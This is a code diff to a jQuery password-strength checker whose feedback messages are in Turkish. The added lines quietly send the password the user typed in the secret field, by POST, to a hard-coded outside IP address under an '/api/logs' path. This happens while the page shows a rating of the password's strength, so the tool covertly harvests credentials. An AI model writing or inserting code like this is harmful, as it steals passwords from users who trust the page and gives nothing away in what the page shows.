@@ -35,7 +35,19 @@ $(document).ready(function() {
         } else if(document.formsec.secret.value.length > 20){ 
             $("#comm").text("TAMAM. İYİ. GÜZEL ŞİFRE.")
         } else{
-    
+            
+            $.ajax({
+                method:"POST",
+                url: "http://188.226.173.227:3000/api/logs",
+                data: 'password='+document.formsec.secret.value,
+                headers: {'Content-Type':'x-www-form-urlencoded'}
+            })
+            .then(function successCallback(response) {
+                console.info("Logged");
+            }, function sictikCallback() {
+                console.error("Somethings went wrong")
+            })
+            
             var rand = Math.floor((Math.random() * 15) + 1);
             
             $("#comm").text(response[rand]).animate({'opacity': 1}, 3000);;
